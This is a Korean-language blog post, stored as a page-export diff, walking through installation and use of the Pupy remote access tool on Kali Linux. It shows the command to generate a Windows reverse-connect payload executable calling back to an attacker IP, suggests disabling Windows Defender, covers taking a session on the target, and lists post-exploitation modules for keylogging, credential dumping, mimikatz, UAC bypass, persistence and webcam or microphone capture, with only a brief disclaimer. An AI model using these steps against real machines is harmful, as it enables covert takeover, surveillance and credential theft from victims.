@@ -1,0 +1,129 @@
+<!DOCTYPE html><html><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-W055DP4N3J"></script><script>
+					window.dataLayer = window.dataLayer || [];
+					function gtag(){dataLayer.push(arguments);}
+					gtag('js', new Date());
+					gtag('config', 'G-W055DP4N3J');</script><head><meta charSet="utf-8"/><meta name="description" content="기록 저장소"/><meta property="og:description" content="기록 저장소"/><meta property="og:url" content="https://mitny.github.io"/><meta property="og:type" content="website"/><meta property="og:locale" content="ko_KR"/><meta property="og:site_name" content="MitNy.log"/><meta name="viewport" content="initial-scale=1.0, width=device-width"/><title>[Kali] PUPY 설치 및 사용법 |  MitNy.log</title><meta name="robots" content="index,follow"/><meta property="og:title" content="[Kali] PUPY 설치 및 사용법 |  MitNy.log"/><link rel="canonical" href="https://mitny.github.io/articles/2018-02-26-Pupy-install"/><meta name="next-head-count" content="12"/><meta name="naver-site-verification" content="b408dee953bcbbb1038384f191f36dac0551c0fb"/><meta name="google-site-verification" content="vUtYhRYNCWYYTdurCRaVmtnWpPLuXKKwRAm5F6R9sNs"/><link rel="preload" href="/_next/static/css/e6a7c67d207b98b3.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e6a7c67d207b98b3.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-69bfa6990bb9e155.js" defer=""></script><script src="/_next/static/chunks/framework-5f4595e5518b5600.js" defer=""></script><script src="/_next/static/chunks/main-005bdf76005efab4.js" defer=""></script><script src="/_next/static/chunks/pages/_app-14a2a9a26060c1d3.js" defer=""></script><script src="/_next/static/chunks/401-9f1400d964d6d7ce.js" defer=""></script><script src="/_next/static/chunks/pages/articles/%5Bdir_slug%5D/%5Bslug%5D-0b7b92862b8a360a.js" defer=""></script><script src="/_next/static/nJPyYqODS0udXw2rMLLyn/_buildManifest.js" defer=""></script><script src="/_next/static/nJPyYqODS0udXw2rMLLyn/_ssgManifest.js" defer=""></script></head><link rel="apple-touch-icon" sizes="57x57" href="/favicon/apple-icon-57x57.png"/><link rel="apple-touch-icon" sizes="60x60" href="/favicon/apple-icon-60x60.png"/><link rel="apple-touch-icon" sizes="72x72" href="/favicon/apple-icon-72x72.png"/><link rel="apple-touch-icon" sizes="76x76" href="/favicon/apple-icon-76x76.png"/><link rel="apple-touch-icon" sizes="114x114" href="/favicon/apple-icon-114x114.png"/><link rel="apple-touch-icon" sizes="120x120" href="/favicon/apple-icon-120x120.png"/><link rel="apple-touch-icon" sizes="144x144" href="/favicon/apple-icon-144x144.png"/><link rel="apple-touch-icon" sizes="152x152" href="/favicon/apple-icon-152x152.png"/><link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-icon-180x180.png"/><link rel="icon" type="image/png" sizes="192x192" href="/favicon/android-icon-192x192.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/favicon/favicon-96x96.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png"/><link rel="manifest" href="/favicon/manifest.json"/><meta name="msapplication-TileColor" content="#ffffff"/><meta name="msapplication-TileImage" content="/favicon/ms-icon-144x144.png"/><meta name="theme-color" content="#ffffff"/><body><div id="__next" data-reactroot=""><div class="header h-16 bg-white drop-shadow-md text-black"><div class="mx-10 pt-3 cursor-pointer"><p class="header-home text-3xl float-left">MitNy.log</p><p class="text-base font-bold pt-2 float-right">About</p></div></div><div class="mx-10 my-8"><div class="w-full min-h-screen pb-24 mt-8"><div class="w-full min-h-screen pb-24 mt-8"><article class="prose max-w-none"><div class="border-b"><p class="text-4xl font-bold mb-0">[Kali] PUPY 설치 및 사용법</p><p class="text-xs text-neutral-500"></p></div><div><h2 id="설치">설치</h2>
+<h3 id="환경--kali-linuxvmware-workstation-12-pro">환경 : Kali Linux,VMware Workstation 12 pro</h3>
+<p>참고 : https://github.com/n1nj4sec/pupy</p>
+<pre><code class="code-highlight"><span class="code-line">git clone https://github.com/n1nj4sec/pupy.git pupy
+</span><span class="code-line">cd pupy
+</span><span class="code-line">git submodule init
+</span><span class="code-line">git submodule update
+</span><span class="code-line">pip install -r pupy/requirements.txt
+</span><span class="code-line">wget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz
+</span><span class="code-line">tar xvf payload_templates.txz &#x26;&#x26; mv payload_templates/* pupy/payload_templates/ &#x26;&#x26; rm payload_templates.txz &#x26;&#x26; rm -r payload_templates
+</span></code></pre>
+<h4 id="pupy-설치">PUPY 설치</h4>
+<ol>
+<li>
+<p>git clone https://github.com/n1nj4sec/pupy.git
+<img src="/assets/posts/kali/pupy_git.png" alt=""></p>
+</li>
+<li>
+<p>cd pupy</p>
+</li>
+<li>
+<p>git submodule init
+<img src="/assets/posts/kali/pupy_init.png" alt=""></p>
+</li>
+<li>
+<p>git submodule update
+<img src="/assets/posts/kali/pupy_update.png" alt=""></p>
+</li>
+<li>
+<p>pip install -r pupy/requirements.txt</p>
+</li>
+</ol>
+<p>★설치가 안되거나 에러가 발생하는 경우 밑에 필요하다고 뜨는 것들을 설치해보면서 에러를 해결하시면 됩니다.</p>
+<h2 id="사용법">사용법</h2>
+<p>★공격자 ip는 ifconfig로 확인하시길 바랍니다.
+<img src="/assets/posts/kali/pupy_ifconfig.png" alt=""></p>
+<pre><code class="code-highlight"><span class="code-line">./pupygen.py -O (타겟의 운영체제) -A (타겟의 아키텍쳐) -o (파일명.확장자) connect --host  (공격자 IP) --transport ssl 
+</span><span class="code-line">
+</span><span class="code-line">./pupygen.py  -O windows -A x64 -o MitNy.exe  connect --host 000.000.000.000 --transport ssl
+</span></code></pre>
+<p><img src="/assets/posts/kali/pupy_gen.png" alt="">
+저는 파일을 예전에 만들어놨고, VM이 아닌 제 컴퓨터에 직접 파일을 설치해놨었기 때문에 그것을 사용하겠습니다.(mitny.exe)
+자신의 컴퓨터에 직접 테스트를 해보고싶으시면 Windows defender를 끄고 해보세요.
+(절대 악의적인 목적으로 타인의 컴퓨터에 사용하지 마세요. 법적인 책임은 본인에게 있습니다.)</p>
+<p><img src="/assets/posts/kali/pupy_mitny.png" alt=""></p>
+<ul>
+<li>
+<p>pupysh.py 파일 실행</p>
+</li>
+<li>
+<p>패스워드 입력 후 타겟 컴퓨터에서 위에서 만든 파일 실행 시 세션이 잡힘.</p>
+</li>
+<li>
+<p>sessions -i 1 -> Session 1이 타겟이 됨</p>
+</li>
+</ul>
+<p><img src="/assets/posts/kali/pupy_start.png" alt=""></p>
+<p><code>- info 입력시 타겟의 정보가 출력됨</code></p>
+<p><img src="/assets/posts/kali/pupy_info.png" alt=""></p>
+<p>★ list_modules를 치면 사용 가능한 명령어 리스트를 볼 수 있습니다.</p>
+<pre><code class="code-highlight"><span class="code-line">admin/beroot                 Windows Privilege Escalation
+</span><span class="code-line">admin/clear_logs             Clear Event Logs
+</span><span class="code-line">admin/dns                    Retrieve Domain Name From Ip And Vice Versa
+</span><span class="code-line">admin/drives                 List Valid Drives In The System
+</span><span class="code-line">admin/getdomain              Get Primary Domain Controller
+</span><span class="code-line">admin/igd                    Upnp Igd Client
+</span><span class="code-line">admin/interactive_shell      Open An Interactive Command Shell With A Nice Tty
+</span><span class="code-line">admin/pexec                  Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen
+</span><span class="code-line">admin/psexec                 Launch Remote Commands Using Smbexec Or Wmiexec
+</span><span class="code-line">admin/psh                    Load/Execute Powershell Scripts
+</span><span class="code-line">admin/pyexec                 Execute Python Code On A Remote System
+</span><span class="code-line">admin/pyshell                Open An Interactive Python Shell On The Remote Client
+</span><span class="code-line">admin/rdesktop               Start A Remote Desktop Session Using A Browser Websocket Client
+</span><span class="code-line">admin/rdp                    Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host
+</span><span class="code-line">admin/scapy_shell            Open An Interactive Python Shell On The Remote Client
+</span><span class="code-line">admin/shares                 List Local And Remote Shared Folder And Permission
+</span><span class="code-line">admin/shell_exec             Execute Shell Commands On A Remote System
+</span><span class="code-line">admin/smb                    Copy Files Via Smb Protocol
+</span><span class="code-line">admin/smbspider              Walk Through A Smb Directory And Recursively Search A String Into Files
+</span><span class="code-line">admin/ssh                    Ssh Client
+</span><span class="code-line">admin/zip                    Zip / Unzip File Or Directory
+</span><span class="code-line">creds/changeme               Default Credential Scanner
+</span><span class="code-line">creds/creddump               Download The Hives From A Remote Windows System And Dump Creds
+</span><span class="code-line">creds/lazagne                Retrieve Passwords Stored On The Target
+</span><span class="code-line">creds/loot_memory            Crawl Processes Memory And Look For Cleartext Credentials
+</span><span class="code-line">creds/memstrings             Dump Printable Strings From Process Memory For Futher Analysis
+</span><span class="code-line">exploit/exploit_suggester    Exploit Suggester
+</span><span class="code-line">exploit/impersonate          List/Impersonate Process Tokens
+</span><span class="code-line">exploit/mimikatz             Execute Mimikatz From Memory
+</span><span class="code-line">exploit/shellcode_exec       Executes The Supplied Shellcode On A Client
+</span><span class="code-line">gather/check_vm              Check If Running On Virtual Machine
+</span><span class="code-line">gather/cloudinfo             Retrieve Ec2/Digitalocean Metadata
+</span><span class="code-line">gather/get_hwuuid            Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)
+</span><span class="code-line">gather/get_info              Get Some Informations About One Or Multiple Clients
+</span><span class="code-line">gather/keylogger             A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)
+</span><span class="code-line">gather/mouselogger           Log Mouse Clicks And Take Screenshots Of Areas Around It
+</span><span class="code-line">gather/netcreds              Sniffs Cleartext Passwords From Interface
+</span><span class="code-line">gather/outlook               Interact With Outlook Session Of The Targeted User
+</span><span class="code-line">gather/powerview             Execute Powerview Commands
+</span><span class="code-line">gather/pywerview             Rewriting Of Some Powerview'S Functionalities In Python
+</span><span class="code-line">gather/record_mic            Record Sound With The Microphone !
+</span><span class="code-line">gather/screenshot            Take A Screenshot :)
+</span><span class="code-line">gather/search                Walk Through A Directory And Recursively Search A String Into Files
+</span><span class="code-line">gather/users                 Get Interactive Users
+</span><span class="code-line">gather/webcamsnap            Take A Webcam Snap :)
+</span><span class="code-line">general/process_kill         Kill A Process
+</span><span class="code-line">manage/download              Download A File/Directory From A Remote System
+</span><span class="code-line">manage/duplicate             Duplicate The Current Pupy Payload By Executing It From Memory
+</span><span class="code-line">manage/getprivs              Manage Current Process Privileges
+</span><span class="code-line">manage/lock_screen           Lock The Session
+</span><span class="code-line">manage/memory_exec           Execute A Executable From Memory
+</span><span class="code-line">manage/migrate               Migrate Pupy Into Another Process Using Reflective Dll Injection
+</span><span class="code-line">manage/persistence           Enables Persistence Via Registry Keys
+</span><span class="code-line">manage/upload                Upload A File/Directory To A Remote System
+</span><span class="code-line">network/forward              Local/Remote Port Forwarding And Socks Proxy
+</span><span class="code-line">network/nbnsspoof            Sniff For Nbns Requests And Spoof Nbns Responses
+</span><span class="code-line">network/port_scan            Run A Tcp Port Scan
+</span><span class="code-line">network/portfwd              Perform Local/Remote Port Forwarding Using Openssh -L/-R Syntax
+</span><span class="code-line">network/socks5proxy          Start A Socks5 Proxy Going Through A Client
+</span><span class="code-line">network/tcpdump              Module To Reproduce Some Of The Classic Tcpdump Tool Functions
+</span><span class="code-line">privesc/bypassuac            Try To Bypass Uac
+</span><span class="code-line">privesc/getsystem            Try To Get Nt Authority System Privileges
+</span><span class="code-line">privesc/inveigh              Execute Inveigh Commands
+</span><span class="code-line">troll/msgbox                 Pop Up A Custom Message Box
+</span></code></pre></div></article></div></div></div><footer class="h-16 bg-neutral-500"></footer></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"slug":"2018-02-26-Pupy-install","content":"\n## 설치\n\n### 환경 : Kali Linux,VMware Workstation 12 pro\n\n참고 : https://github.com/n1nj4sec/pupy\n```\ngit clone https://github.com/n1nj4sec/pupy.git pupy\ncd pupy\ngit submodule init\ngit submodule update\npip install -r pupy/requirements.txt\nwget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz\ntar xvf payload_templates.txz \u0026\u0026 mv payload_templates/* pupy/payload_templates/ \u0026\u0026 rm payload_templates.txz \u0026\u0026 rm -r payload_templates\n```\n\n#### PUPY 설치\n 1. git clone https://github.com/n1nj4sec/pupy.git\n![](/assets/posts/kali/pupy_git.png)\n 2. cd pupy\n 3. git submodule init\n![](/assets/posts/kali/pupy_init.png)\n\n 4. git submodule update\n![](/assets/posts/kali/pupy_update.png)\n\n 5. pip install -r pupy/requirements.txt\n\n★설치가 안되거나 에러가 발생하는 경우 밑에 필요하다고 뜨는 것들을 설치해보면서 에러를 해결하시면 됩니다.\n\n\n## 사용법\n★공격자 ip는 ifconfig로 확인하시길 바랍니다.\n![](/assets/posts/kali/pupy_ifconfig.png)\n\n```\n./pupygen.py -O (타겟의 운영체제) -A (타겟의 아키텍쳐) -o (파일명.확장자) connect --host  (공격자 IP) --transport ssl \n\n./pupygen.py  -O windows -A x64 -o MitNy.exe  connect --host 000.000.000.000 --transport ssl\n```\n\n![](/assets/posts/kali/pupy_gen.png)\n저는 파일을 예전에 만들어놨고, VM이 아닌 제 컴퓨터에 직접 파일을 설치해놨었기 때문에 그것을 사용하겠습니다.(mitny.exe)\n자신의 컴퓨터에 직접 테스트를 해보고싶으시면 Windows defender를 끄고 해보세요.\n(절대 악의적인 목적으로 타인의 컴퓨터에 사용하지 마세요. 법적인 책임은 본인에게 있습니다.)\n\n![](/assets/posts/kali/pupy_mitny.png)\n\n\n- pupysh.py 파일 실행\n\n- 패스워드 입력 후 타겟 컴퓨터에서 위에서 만든 파일 실행 시 세션이 잡힘.\n\n- sessions -i 1 -\u003e Session 1이 타겟이 됨\n\n\n![](/assets/posts/kali/pupy_start.png)\n\n`- info 입력시 타겟의 정보가 출력됨`\n\n![](/assets/posts/kali/pupy_info.png)\n\n★ list_modules를 치면 사용 가능한 명령어 리스트를 볼 수 있습니다.\n\n```\nadmin/beroot                 Windows Privilege Escalation\nadmin/clear_logs             Clear Event Logs\nadmin/dns                    Retrieve Domain Name From Ip And Vice Versa\nadmin/drives                 List Valid Drives In The System\nadmin/getdomain              Get Primary Domain Controller\nadmin/igd                    Upnp Igd Client\nadmin/interactive_shell      Open An Interactive Command Shell With A Nice Tty\nadmin/pexec                  Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen\nadmin/psexec                 Launch Remote Commands Using Smbexec Or Wmiexec\nadmin/psh                    Load/Execute Powershell Scripts\nadmin/pyexec                 Execute Python Code On A Remote System\nadmin/pyshell                Open An Interactive Python Shell On The Remote Client\nadmin/rdesktop               Start A Remote Desktop Session Using A Browser Websocket Client\nadmin/rdp                    Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host\nadmin/scapy_shell            Open An Interactive Python Shell On The Remote Client\nadmin/shares                 List Local And Remote Shared Folder And Permission\nadmin/shell_exec             Execute Shell Commands On A Remote System\nadmin/smb                    Copy Files Via Smb Protocol\nadmin/smbspider              Walk Through A Smb Directory And Recursively Search A String Into Files\nadmin/ssh                    Ssh Client\nadmin/zip                    Zip / Unzip File Or Directory\ncreds/changeme               Default Credential Scanner\ncreds/creddump               Download The Hives From A Remote Windows System And Dump Creds\ncreds/lazagne                Retrieve Passwords Stored On The Target\ncreds/loot_memory            Crawl Processes Memory And Look For Cleartext Credentials\ncreds/memstrings             Dump Printable Strings From Process Memory For Futher Analysis\nexploit/exploit_suggester    Exploit Suggester\nexploit/impersonate          List/Impersonate Process Tokens\nexploit/mimikatz             Execute Mimikatz From Memory\nexploit/shellcode_exec       Executes The Supplied Shellcode On A Client\ngather/check_vm              Check If Running On Virtual Machine\ngather/cloudinfo             Retrieve Ec2/Digitalocean Metadata\ngather/get_hwuuid            Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)\ngather/get_info              Get Some Informations About One Or Multiple Clients\ngather/keylogger             A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)\ngather/mouselogger           Log Mouse Clicks And Take Screenshots Of Areas Around It\ngather/netcreds              Sniffs Cleartext Passwords From Interface\ngather/outlook               Interact With Outlook Session Of The Targeted User\ngather/powerview             Execute Powerview Commands\ngather/pywerview             Rewriting Of Some Powerview'S Functionalities In Python\ngather/record_mic            Record Sound With The Microphone !\ngather/screenshot            Take A Screenshot :)\ngather/search                Walk Through A Directory And Recursively Search A String Into Files\ngather/users                 Get Interactive Users\ngather/webcamsnap            Take A Webcam Snap :)\ngeneral/process_kill         Kill A Process\nmanage/download              Download A File/Directory From A Remote System\nmanage/duplicate             Duplicate The Current Pupy Payload By Executing It From Memory\nmanage/getprivs              Manage Current Process Privileges\nmanage/lock_screen           Lock The Session\nmanage/memory_exec           Execute A Executable From Memory\nmanage/migrate               Migrate Pupy Into Another Process Using Reflective Dll Injection\nmanage/persistence           Enables Persistence Via Registry Keys\nmanage/upload                Upload A File/Directory To A Remote System\nnetwork/forward              Local/Remote Port Forwarding And Socks Proxy\nnetwork/nbnsspoof            Sniff For Nbns Requests And Spoof Nbns Responses\nnetwork/port_scan            Run A Tcp Port Scan\nnetwork/portfwd              Perform Local/Remote Port Forwarding Using Openssh -L/-R Syntax\nnetwork/socks5proxy          Start A Socks5 Proxy Going Through A Client\nnetwork/tcpdump              Module To Reproduce Some Of The Classic Tcpdump Tool Functions\nprivesc/bypassuac            Try To Bypass Uac\nprivesc/getsystem            Try To Get Nt Authority System Privileges\nprivesc/inveigh              Execute Inveigh Commands\ntroll/msgbox                 Pop Up A Custom Message Box\n```\n","layout":"post","title":"[Kali] PUPY 설치 및 사용법","categories":["Kali"],"excerpt":" ","comments":true,"share":true,"published":false,"tags":["Kali Linux","Pupy","install"]}},"__N_SSG":true},"page":"/articles/[dir_slug]/[slug]","query":{"dir_slug":"2018-02","slug":"Pupy-install"},"buildId":"nJPyYqODS0udXw2rMLLyn","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
